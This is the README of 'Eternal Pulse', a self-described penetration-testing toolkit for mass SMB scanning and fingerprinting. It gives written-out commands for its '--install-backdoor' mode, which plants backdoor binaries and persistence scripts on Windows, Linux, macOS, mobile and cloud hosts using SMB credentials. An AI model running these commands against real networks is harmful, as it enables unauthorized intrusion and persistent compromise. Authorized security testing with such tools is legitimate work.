
<img width="777" height="236" alt="Screenshot 2025-07-25 at 4 28 48 PM" src="https://github.com/user-attachments/assets/4928cc30-78e2-4d88-b904-6979f031d4ee" />

# Eternal Pulse

**Eternal Pulse** is an advanced network security toolkit designed for penetration testers and security professionals. It provides a comprehensive suite of tools for discovering, analyzing, and assessing the security posture of SMB services across a network. Its capabilities range from high-speed network scanning and OS fingerprinting to deploying custom payloads for authorized security assessments.

-----

## 🛑 Ethical Use Disclaimer

This tool is intended for **authorized security testing and educational purposes only**. Using Eternal Pulse to attack targets without prior mutual consent is illegal. The developers assume no liability and are not responsible for any misuse or damage caused by this program. **Always respect the law and obtain explicit permission before scanning or assessing any network or system.**

-----

## ✨ Core Features

  * **High-Performance SMB Scanning**: Utilizes multi-threading and optional `asyncio` support for rapid discovery of open SMB ports (445/TCP) across large network ranges.
  * **Flexible Targeting**: Specify targets individually, in CIDR notation, or from a newline-separated file.
  * **In-Depth Host Analysis**:
      * **OS Fingerprinting**: Actively detects the remote operating system.
      * **Vulnerability Scanning**: Integrates Nmap Scripting Engine (NSE) to automatically check for common SMB-related vulnerabilities.
      * **Share Enumeration**: Lists accessible SMB shares on target systems.
  * **Cross-Platform Payload Deployment**: A modular framework to deploy and execute payloads on a variety of target systems, including:
      * Windows
      * Linux
      * macOS
      * Android & iOS
      * Cloud Environments (AWS, Azure, GCP)
  * **Secure Payload Handling**: Uses an RSA & AES encryption scheme to protect payloads during transfer.
  * **Session Persistence**: Save scan results to a JSON file and reload them later to resume an assessment without re-scanning.

-----

## ⚙️ Installation

You'll need **Python 3.8+** and **Nmap** installed and available in your system's PATH.

```bash
# Clone the repository
git clone https://github.com/your-username/eternal-pulse.git
cd eternal-pulse

# Minimal installation
pip install .

# Full installation with all dependencies
pip install .[full]
```

-----

## 🚀 Usage

The tool is run from the command line using `eternal-pulse`. Below are common use cases.

### Basic Scanning

  * **Scan a few specific hosts:**

    ```bash
    eternal-pulse --host 192.168.1.10 --host 192.168.1.11
    ```

  * **Scan an entire subnet using CIDR notation:**

    ```bash
    eternal-pulse --cidr 192.168.1.0/24 --workers 150
    ```

  * **Scan targets from a file and save the results:**

    ```bash
    eternal-pulse --input targets.txt --save results.json
    ```

### Saving and Loading Sessions

You can save scan results to avoid repeating the discovery phase. This is especially useful for large networks.

  * **Save successful scans to `results.json`:**

    ```bash
    eternal-pulse --cidr 10.0.0.0/16 --save results.json
    ```

  * **Reload a previous session to perform new actions (e.g., deploy payloads):**

    ```bash
    eternal-pulse --reload results.json --install-payload
    ```

### Payload Deployment

After identifying accessible hosts, you can use the `--install-backdoor` flag to deploy a payload. The required arguments change based on the target OS (`--remote-os`).

> **Warning:** This action is intrusive. Only proceed if you have explicit authorization.

#### **Windows Deployment Example**

This example deploys a Windows executable (`backdoor.exe`) by authenticating to the target's SMB service. The payload is encrypted using a provided AES utility and an RSA key pair.

```bash
eternal-pulse --reload results.json --install-backdoor \
    --remote-os windows \
    --username admin --password 'P@ssw0rd!' \
    --key /path/to/privkey.pem \
    --server-pubkey /path/to/server.pub \
    --aes-binary /path/to/aes_encrypt.exe \
    --backdoor-binary /path/to/backdoor.exe
```

#### **Linux Deployment Example**

This example deploys a binary and a persistence script to a Linux target via an accessible Samba share.

```bash
eternal-pulse --reload results.json --install-backdoor \
    --remote-os linux --share 'tmp' \
    --username samba_user --password 'share_password' \
    --key /path/to/privkey.pem \
    --server-pubkey /path/to/server.pub \
    --aes-binary /path/to/aes_encrypt_linux \
    --backdoor-binary /path/to/linux_payload \
    --backdoor-script /path/to/persistence.sh
```

-----

## 📋 Argument Reference

### Scanning Options

| Argument | Description |
| :--- | :--- |
| `--host [IP]` | Specify a host to scan. Can be used multiple times. |
| `--cidr [CIDR]` | Specify a CIDR network range to scan. |
| `--input [file]` | Path to a file with newline-separated targets. |
| `--timeout [sec]`| Connection timeout in seconds. Default: `2`. |
| `--workers [num]`| Number of parallel scanning threads. Default: `100`. |
| `--asyncio` | Use the `asyncio` library for scanning instead of threads. |
| `--allowlist [file]`| Path to a JSON file containing IPs/networks to scan. |
| `--save [file]` | Save successful scan results to a JSON file. |
| `--reload [file]` | Reload a previous scan session from a JSON file. |
| `--json` | Print the final results as a raw JSON object. |
| `--quiet` | Suppress all non-essential output. |

### Payload Deployment Options

| Argument | Description | Required For |
| :--- | :--- | :--- |
| `--install-backdoor`| Enable payload deployment mode. | All Deployments |
| `--remote-os [os]` | Target OS. Choices: `windows`, `linux`, `macos`, `android`, etc. | All Deployments |
| `--username [user]` | SMB username for authentication. | All Deployments |
| `--password [pass]` | SMB password for authentication. | Most Deployments |
| `--domain [domain]` | Windows domain for authentication. | Windows |
| `--use-kerberos`| Use Kerberos for authentication instead of NTLM. | Windows |
| `--share [name]` | Name of the SMB share to connect to. | Linux, macOS, etc. |
| `--key [file]` | Path to your local RSA-2048 private key (PEM). | `windows`, `linux`, `macos`, clouds |
| `--server-pubkey [file]` | Path to the server's RSA-2048 public key (PEM). | `windows`, `linux`, `macos`, clouds |
| `--aes-binary [file]`| Path to the local AES encryption helper binary. | `windows`, `linux`, `macos`, clouds |
| `--backdoor-binary [file]`| Path to the main payload binary/executable. | `windows`, `linux`, `macos`, clouds |
| `--backdoor-script [file]`| Path to a persistence script (`.sh`). | `linux`, clouds |
| `--backdoor-plist [file]`| Path to a persistence script (`.plist`). | `macos` |
| `--apk [file]`| Path to the Android payload (`.apk`). | `android` |
| `--ipa [file]`| Path to the iOS payload (`.ipa`). | `ios` |

-----

## 📜 License

This project is licensed under the MIT License. See the [LICENSE](https://www.google.com/search?q=LICENSE) file for details.
